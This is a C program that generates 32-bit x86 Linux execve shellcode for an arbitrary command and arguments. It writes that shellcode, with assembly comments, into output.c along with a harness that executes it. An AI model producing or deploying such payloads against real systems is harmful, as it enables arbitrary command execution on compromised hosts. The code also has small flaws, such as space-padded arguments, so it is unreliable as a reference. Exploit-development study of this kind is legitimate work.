#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]){
	if(argc > 3){
		FILE *f;
		f = fopen("output.c","w");
		fprintf(f, "%s\n","#include <stdio.h>");
		fprintf(f, "%s\n\n","#include <unistd.h>");
		fprintf(f, "%s\n","//Shellcode comments in NASM syntax.");
		fprintf(f, "%s","char *shellcode=\"");
		fprintf(f, "%s\"//xor eax,eax\n","\\x31\\xc0");

		//find how many padding / are needed
		int paddingNeeded = (4 -((strlen(argv[1]))%4));

		//extra one for null byte
		char *shellcode = calloc((strlen(argv[1])+paddingNeeded+1),sizeof(char));

		//add / padding at start of str
		for(int i = 0;i < paddingNeeded; i++){
			strncpy(&shellcode[i],"/",1);
		}

		//add in arg passed in
		strncpy(&shellcode[paddingNeeded],argv[1],strlen(argv[1]));
		//push cmd onto the stack and set arg 1 of execve to point to it
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		for(int i = (strlen(shellcode)); i > 0; i = i - 4){
			fprintf(f,"\"%s","\\x68");
			fprintf(f,"\\x%x",shellcode[i-4]);
			fprintf(f,"\\x%x",shellcode[i-3]);
			fprintf(f,"\\x%x",shellcode[i-2]);
			fprintf(f,"\\x%x\"",shellcode[i-1]);
			//write comment of what assembly is
			fprintf(f," //push '%c%c%c%c'\n",shellcode[i-4],shellcode[i-3],shellcode[i-2],shellcode[i-1]);
		}
		//free(shellcode);
		fprintf(f, "\"%s\" //mov ebx,esp\n","\\x89\\xe3");

		//create the array of parameters and save location of array
		//so later can add in addr to each arg
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		//as argv[0] is how was called, argv[1] is add at end
		for(int i = 0; i < (argc-2); i++){
			fprintf(f, "\"%s\" //push eax\n","\\x50");
		}
		fprintf(f, "\"%s\" //push ebx\n","\\x53");
		fprintf(f, "\"%s\" //mov ecx,esp\n","\\x89\\xe1");

		//push each arg to stack and then add addr to the arg array
		for(int i = 2; i < argc; i++){
			fprintf(f, "\"%s\" //push eax\n","\\x50");

			//if arg to add starts with tac
			char tac = '-';
			if( (strncmp(&tac, argv[i], 1) == 0) ){
				fprintf(f, "\"%s%x%s%x\" //pushw ''\n","\\x66\\x68\\x",argv[i][0],"\\x",argv[i][1]);
			}else{
				//find how many padding spaces needed
				int spacesNeeded = (4 -((strlen(argv[i]))%4));

				//extra one for null byte
				char *shellcodeTemp = calloc((strlen(argv[i])+spacesNeeded+1),sizeof(char));

				//add in arg passed in
				strncpy(&shellcodeTemp[0],argv[i],strlen(argv[i]));

				//add space padding at end of str
				for(int x = 0;x < spacesNeeded; x = x +1){
					strncpy(&shellcodeTemp[(x+strlen(argv[i]))]," ",1);
				}

				//push cmd onto the stack and set arg 1 of execve to point to it
				for(int x = (strlen(shellcodeTemp)); x > 0; x = x - 4){
					fprintf(f,"\"%s","\\x68");
					fprintf(f,"\\x%x",shellcodeTemp[x-4]);
					fprintf(f,"\\x%x",shellcodeTemp[x-3]);
					fprintf(f,"\\x%x",shellcodeTemp[x-2]);
					fprintf(f,"\\x%x\"",shellcodeTemp[x-1]);
					//write comment of what assembly is
					fprintf(f," //push '%c%c%c%c'\n",shellcodeTemp[x-4],shellcodeTemp[x-3],shellcodeTemp[x-2],shellcodeTemp[x-1]);
				}
				//free(shellcodeTemp);
			}

			fprintf(f, "\"%s\" //mov edx,esp\n","\\x89\\xe2");
			//now change pointer in array to this param pushed onto stack
			int offset = ((i-1)*4);
			fprintf(f, "\"%s%x\" //mov [ecx+%d],edx\n","\\x89\\x51\\x",offset,offset);
		}

		//point the 3rd env syscall arg to null
		fprintf(f, "\"%s\" //push eax\n","\\x50");
		fprintf(f, "\"%s\" //mov edx,esp\n","\\x89\\xe2");

		//call execve
		fprintf(f, "\"%s\" //mov al,11\n","\\xb0\\x0b");
		fprintf(f, "\"%s\"; //int $0x80\n\n","\\xcd\\x80");

		fprintf(f, "%s\n","int main(){");
		fprintf(f, "%s\n","    int (*ret)() = (int(*)())shellcode;");
		fprintf(f, "%s\n","    ret();");
		fprintf(f, "%s\n","}");
		fclose(f);
	}else{
		printf("%s\n","Needs args.");
	}
}
